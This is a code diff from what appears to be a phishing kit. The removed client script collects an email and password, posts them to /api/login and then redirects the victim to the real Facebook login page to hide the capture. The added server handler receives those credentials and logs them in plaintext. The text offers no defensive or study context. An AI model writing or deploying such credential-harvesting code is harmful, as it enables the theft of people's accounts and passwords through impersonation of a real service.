@@ -1,30 +1,22 @@
-// login.js
-
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-
-  const formData = new FormData(e.target);
-  const data = {
-    email: formData.get('email'),
-    password: formData.get('password')
-  };
+export default async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ message: 'Method Not Allowed' });
+  }
 
   try {
-    // Send data to your backend API
-    const response = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    });
+    const { email, password } = req.body;
 
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
+    if (!email || !password) {
+      return res.status(400).json({ message: 'Missing email or password' });
     }
 
-    // After sending, redirect to the real Facebook login
-    window.location.href = 'https://www.facebook.com/login/';
+    // Do something with data, e.g. log or save (for testing)
+    console.log('Received login:', email, password);
+
+    // Respond success
+    return res.status(200).json({ message: 'Login data received' });
   } catch (error) {
-    console.error('Login submission failed:', error);
-    alert('Failed to submit login. Please try again.');
+    console.error('Error in /api/login:', error);
+    return res.status(500).json({ message: 'Internal Server Error' });
   }
-});
+}
